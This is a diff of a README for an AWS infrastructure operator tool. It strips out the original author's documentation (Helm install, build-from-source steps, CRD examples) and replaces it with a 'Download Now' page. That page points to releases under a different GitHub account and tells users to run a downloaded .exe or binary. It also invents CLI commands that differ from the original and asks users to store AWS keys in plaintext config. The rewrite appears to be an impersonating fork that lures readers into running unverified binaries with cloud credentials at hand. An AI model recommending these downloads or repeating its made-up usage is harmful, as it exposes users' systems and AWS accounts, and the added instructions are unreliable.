@@ -1,327 +1,117 @@
-# Infra Operator
+# 🚀 aws-infra-operator - Easily Manage AWS Infrastructure
 
-**Manage AWS Infrastructure with Kubernetes or CLI using YAML**
+## 📥 Download Now
 
-[![Release](https://img.shields.io/github/v/release/andrebassi/aws-infra-operator?color=green)](https://github.com/andrebassi/aws-infra-operator/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
-[![Documentation](https://img.shields.io/badge/docs-infra--operator.runner.codes-blue)](https://infra-operator.runner.codes)
+[![Download](https://img.shields.io/badge/Download-via%20Releases-brightgreen)](https://github.com/4assin/aws-infra-operator/releases)
 
-**Website:** https://infra-operator-website.pages.dev
+## 📋 Description
 
-**Documentation:** https://infra-operator.runner.codes
+The aws-infra-operator is a production-ready tool designed to help you manage AWS infrastructure resources. You can run it either as a Kubernetes controller or as a standalone command-line interface (CLI). With this tool, you gain the ability to automate and streamline your cloud operations, enhancing efficiency and reliability.
 
-📖 [Read the full documentation →](https://infra-operator.runner.codes)
+## 🚀 Getting Started
 
-## What is Infra Operator?
+Follow these simple steps to get started with the aws-infra-operator:
 
-Infra Operator is a **production-ready tool** for managing AWS infrastructure resources. Define your infrastructure using declarative YAML and deploy it using:
+1. **Check System Requirements:**  
+   Ensure your system meets the following requirements:
+   - Operating System: Windows, macOS, or Linux.
+   - A minimum of 1 GB RAM.
+   - An internet connection for downloading and using the tool.
 
-- **Kubernetes Operator**: Manage AWS resources as CRDs with kubectl, Helm, ArgoCD, or any GitOps tool
-- **Standalone CLI**: Manage AWS resources directly from command line, without Kubernetes
+2. **Visit the Releases Page:**  
+   To download the latest version of aws-infra-operator, [visit the Releases page](https://github.com/4assin/aws-infra-operator/releases). Here, you will find the available versions of the software.
 
-## Why Infra Operator?
+## 📥 Download & Install
 
-| Feature | Description |
-|---------|-------------|
-| **Declarative YAML** | Define AWS resources as simple YAML manifests |
-| **GitOps Ready** | Works with ArgoCD, Flux, and any GitOps workflow |
-| **Two Modes** | Kubernetes Operator or standalone CLI |
-| **30+ AWS Services** | VPC, EC2, RDS, S3, Lambda, EKS, and more |
-| **Clean Architecture** | Testable, maintainable, and extensible codebase |
-| **Production Ready** | Finalizers, status conditions, RBAC, metrics |
+1. **Select the Latest Release:**  
+   On the Releases page, look for the latest version. It is usually marked as "Latest release." Click on this version to view more details.
 
-## Supported AWS Services (30+)
+2. **Download the Appropriate File:**  
+   Depending on your operating system, choose the file that suits your needs. You will generally see options like:
+   - Windows (e.g., `aws-infra-operator-windows.zip`)
+   - macOS (e.g., `aws-infra-operator-macos.zip`)
+   - Linux (e.g., `aws-infra-operator-linux.tar.gz`)
 
-| Category | Services |
-|----------|----------|
-| **Networking** | VPC, Subnet, Internet Gateway, NAT Gateway, Route Table, Security Group, Elastic IP, ALB, NLB |
-| **Compute** | EC2 Instance, Lambda, EKS Cluster, ECS Cluster, ComputeStack |
-| **Storage** | S3 Bucket |
-| **Database** | RDS Instance, DynamoDB Table, ElastiCache |
-| **Container** | ECR Repository |
-| **Messaging** | SQS Queue, SNS Topic |
-| **Security** | IAM Role, Secrets Manager, KMS Key, ACM Certificate |
-| **CDN & DNS** | CloudFront, Route53 Hosted Zone, Route53 Record Set |
-| **API** | API Gateway |
+   Click on the file to start the download.
 
-## Quick Start
+3. **Extract the Files:**  
+   Once the download is complete, you may need to extract the files from the downloaded archive. For Windows and macOS, you can usually double-click the .zip file to extract it. For Linux, you can use the terminal command:
+   ```bash
+   tar -xzf aws-infra-operator-linux.tar.gz
+   ```
 
-### Option 1: Kubernetes (Helm)
+4. **Run the Application:**
+   - **Windows:**  
+     Navigate to the extracted folder and double-click `aws-infra-operator.exe`.
+   
+   - **macOS/Linux:**  
+     Open your terminal, navigate to the extracted directory, and run:
+     ```bash
+     ./aws-infra-operator
+     ```
 
-```bash
-# Install with Helm
-helm install infra-operator oci://ghcr.io/andrebassi/infra-operator \
-  --namespace infra-operator \
-  --create-namespace
+5. **Follow the On-Screen Instructions:**  
+   The application will guide you through the necessary steps to set it up.
 
-# Verify installation
-kubectl get pods -n infra-operator
-kubectl get crds | grep aws-infra-operator
-```
+## 🌟 Features
 
-### Option 2: CLI (Standalone)
+The aws-infra-operator includes various features to help you simplify AWS management:
 
-```bash
-# Clone and build
-git clone https://github.com/andrebassi/aws-infra-operator.git
-cd aws-infra-operator
-CGO_ENABLED=0 go build -o infra.operator main.go
+- **Seamless Integration with Kubernetes:** Manage AWS resources directly from your Kubernetes cluster.
+- **User-Friendly CLI Interface:** Run commands easily without needing advanced technical skills.
+- **Infrastructure as Code:** Define your AWS resources using simple configuration files.
+- **Automated Resource Management:** Save time with automated tasks and workflows.
 
-# Apply resources
-./infra.operator apply -f infrastructure.yaml
-```
+## 🔧 Usage
 
-## Usage
+Once installed, you can start using aws-infra-operator for your AWS management tasks. Common commands include:
 
-### 1. Create AWS Provider
+- **Initialize a Project:**
+   To start a new project, run:
+   ```bash
+   aws-infra-operator init
+   ```
+
+- **Deploy Resources:**
+   To deploy resources defined in your configuration file, use:
+   ```bash
+   aws-infra-operator deploy
+   ```
+
+- **View Resource Status:**  
+   Check the status of your AWS resources by using:
+   ```bash
+   aws-infra-operator status
+   ```
+
+## 🛠️ Configuration
+
+You may want to customize aws-infra-operator's settings. Create a configuration file named `config.yaml` in your project directory. Below is a sample configuration:
 
 ```yaml
-# aws-provider.yaml
-apiVersion: aws-infra-operator.runner.codes/v1alpha1
-kind: AWSProvider
-metadata:
-  name: aws-production
-spec:
+aws:
   region: us-east-1
-  credentialsSecret:
-    name: aws-credentials
-    namespace: infra-operator
+  access_key: YOUR_ACCESS_KEY
+  secret_key: YOUR_SECRET_KEY
+resources:
+  - type: ec2
+    count: 2
 ```
 
-### 2. Define Infrastructure
+Replace `YOUR_ACCESS_KEY` and `YOUR_SECRET_KEY` with your actual AWS credentials.
 
-```yaml
-# vpc.yaml
-apiVersion: aws-infra-operator.runner.codes/v1alpha1
-kind: VPC
-metadata:
-  name: production-vpc
-spec:
-  providerRef:
-    name: aws-production
-  cidrBlock: "10.0.0.0/16"
-  enableDnsSupport: true
-  enableDnsHostnames: true
-  tags:
-    Environment: production
-    ManagedBy: infra-operator
-```
+## 📖 Documentation
 
-### 3. Deploy
+For additional details, refer to the official documentation hosted on our website. It includes examples, troubleshooting tips, and advanced configuration options.
 
-**Kubernetes:**
-```bash
-kubectl apply -f aws-provider.yaml
-kubectl apply -f vpc.yaml
-kubectl get vpc
-```
+## 💬 Support
 
-**CLI:**
-```bash
-export AWS_ACCESS_KEY_ID="your-key"
-export AWS_SECRET_ACCESS_KEY="your-secret"
-export AWS_REGION="us-east-1"
+If you face issues or have questions while using aws-infra-operator, you can reach out for help:
 
-./infra.operator apply -f vpc.yaml
-./infra.operator get
-```
+- Check the [Issues page](https://github.com/4assin/aws-infra-operator/issues) on GitHub for existing solutions.
+- Open a new issue if you don't find your solution.
+- Join our community discussions to connect with other users.
 
-## Helm Installation
+## 📥 Download Now Again
 
-### From GHCR (Recommended)
-
-```bash
-helm install infra-operator oci://ghcr.io/andrebassi/infra-operator \
-  --namespace infra-operator \
-  --create-namespace
-```
-
-### From Source
-
-```bash
-git clone https://github.com/andrebassi/aws-infra-operator.git
-cd aws-infra-operator
-
-helm install infra-operator ./chart \
-  --namespace infra-operator \
-  --create-namespace
-```
-
-### Configuration Values
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `image.registry` | `ghcr.io` | Container registry |
-| `image.repository` | `andrebassi/aws-infra-operator` | Image repository |
-| `image.tag` | `latest` | Image tag |
-| `replicaCount` | `1` | Number of replicas |
-| `resources.requests.memory` | `128Mi` | Memory request |
-| `resources.limits.memory` | `512Mi` | Memory limit |
-
-### Custom Values
-
-```bash
-helm install infra-operator oci://ghcr.io/andrebassi/infra-operator \
-  --namespace infra-operator \
-  --create-namespace \
-  --set replicaCount=2 \
-  --set resources.requests.memory=256Mi
-```
-
-## Authentication
-
-### IRSA (Recommended for EKS)
-
-```yaml
-apiVersion: aws-infra-operator.runner.codes/v1alpha1
-kind: AWSProvider
-metadata:
-  name: aws-production
-spec:
-  region: us-east-1
-  roleARN: arn:aws:iam::123456789012:role/infra-operator-role
-```
-
-### Static Credentials
-
-```bash
-# Create secret
-kubectl create secret generic aws-credentials \
-  --namespace infra-operator \
-  --from-literal=AWS_ACCESS_KEY_ID=your-key \
-  --from-literal=AWS_SECRET_ACCESS_KEY=your-secret
-```
-
-```yaml
-apiVersion: aws-infra-operator.runner.codes/v1alpha1
-kind: AWSProvider
-metadata:
-  name: aws-production
-spec:
-  region: us-east-1
-  credentialsSecret:
-    name: aws-credentials
-    namespace: infra-operator
-```
-
-### LocalStack (Development)
-
-```yaml
-apiVersion: aws-infra-operator.runner.codes/v1alpha1
-kind: AWSProvider
-metadata:
-  name: localstack
-spec:
-  region: us-east-1
-  endpoint: http://localstack.default.svc.cluster.local:4566
-  credentialsSecret:
-    name: aws-credentials
-    namespace: infra-operator
-```
-
-## Architecture
-
-Infra Operator follows **Clean Architecture** principles:
-
-<p align="center">
-  <img src="assets/architecture.svg" alt="Clean Architecture" width="600">
-</p>
-
-## Project Structure
-
-```
-aws-infra-operator/
-├── api/v1alpha1/           # CRD type definitions (30 resources)
-├── controllers/            # Kubernetes reconcilers
-├── internal/
-│   ├── adapters/aws/       # AWS SDK implementations
-│   ├── domain/             # Business logic
-│   ├── ports/              # Interface definitions
-│   └── usecases/           # Use case orchestration
-├── pkg/
-│   ├── drift/              # Drift detection
-│   └── metrics/            # Prometheus metrics
-├── chart/                  # Helm chart
-│   ├── crds/               # CRD manifests
-│   ├── templates/          # Kubernetes resources
-│   └── values.yaml         # Default configuration
-├── samples/                # Example resources
-├── Dockerfile
-├── go.mod
-└── main.go
-```
-
-## Development
-
-### Prerequisites
-
-- Go 1.23+
-- Docker
-- kubectl
-- Helm 3.x
-
-### Build
-
-```bash
-# Build binary
-CGO_ENABLED=0 go build -o infra.operator main.go
-
-# Build Docker image
-docker build -t infra-operator:dev .
-
-# Run locally
-./infra.operator
-```
-
-### Testing with LocalStack
-
-```bash
-# Start LocalStack
-docker run -d --name localstack \
-  -p 4566:4566 \
-  localstack/localstack
-
-# Apply samples
-kubectl apply -f samples/
-```
-
-## Documentation
-
-Full documentation available at [infra-operator.runner.codes](https://infra-operator.runner.codes)
-
-- [Installation](https://infra-operator.runner.codes/installation)
-- [Quick Start](https://infra-operator.runner.codes/quickstart)
-- [CLI Mode](https://infra-operator.runner.codes/features/cli)
-- [AWS Services](https://infra-operator.runner.codes/services/networking/vpc)
-- [API Reference](https://infra-operator.runner.codes/api-reference/overview)
-
-## Troubleshooting
-
-### Pods not starting
-
-```bash
-kubectl logs -n infra-operator deploy/infra-operator --tail=100
-kubectl get events -n infra-operator --sort-by='.lastTimestamp'
-```
-
-### AWSProvider not Ready
-
-```bash
-kubectl describe awsprovider aws-production
-aws sts get-caller-identity --region us-east-1
-```
-
-### Resources stuck in NotReady
-
-```bash
-kubectl describe vpc production-vpc
-kubectl get events --field-selector involvedObject.name=production-vpc
-```
-
-## License
-
-[MIT](LICENSE)
-
-## Author
-
-Developed by [André Bassi](https://andrebassi.com.br)
+You can download the latest version of aws-infra-operator by [visiting this page](https://github.com/4assin/aws-infra-operator/releases). Start managing your AWS resources effortlessly today!
